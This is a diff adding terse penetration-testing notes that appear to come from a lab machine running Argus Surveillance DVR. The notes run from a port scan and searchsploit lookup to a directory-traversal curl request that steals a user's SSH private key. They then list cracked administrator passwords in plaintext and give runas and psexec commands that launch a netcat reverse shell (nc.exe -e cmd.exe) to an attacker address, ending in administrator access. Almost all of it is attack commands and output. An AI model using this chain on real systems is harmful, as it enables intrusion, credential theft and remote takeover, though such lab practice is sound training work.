@@ -1,0 +1,39 @@
+PORT      STATE SERVICE
+22/tcp    open  ssh
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5040/tcp  open  unknown
+8080/tcp  open  http-proxy
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+
+$ searchsploit Argus Surveillance DVR
+Argus Surveillance DVR 4.0 - Weak Password Encryption           | windows/local/50130.py
+Argus Surveillance DVR 4.0.0.0 - Directory Traversal            | windows_x86/webapps/45296.txt
+
+curl "http://192.168.174.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"
+
+chmod 600 id_rsa
+ssh -i id_rsa viewer@192.168.174.179
+
+cat C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
+administrator
+found weak password encryption.
+Argus Surveillance DVR 4.0 - Weak Password Encryption                | windows/local/50130.py
+ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8 : 14WatchD0g$ 
+5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE : ImWatchingY0u
+
+runas /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe 192.168.45.217 4444"
+14WatchD0g$
+# or use tools found at PWD. (no "" for psexec.exe)(-accepteula for all sysinternals tools)
+.\psexec.exe -accepteula -u Administrator -p 14WatchD0g$ C:\Users\viewer\nc.exe 192.168.45.154 4
+444 -e cmd.exe
+
+C:\WINDOWS\system32>whoami
+whoami
+dvr4\administrator
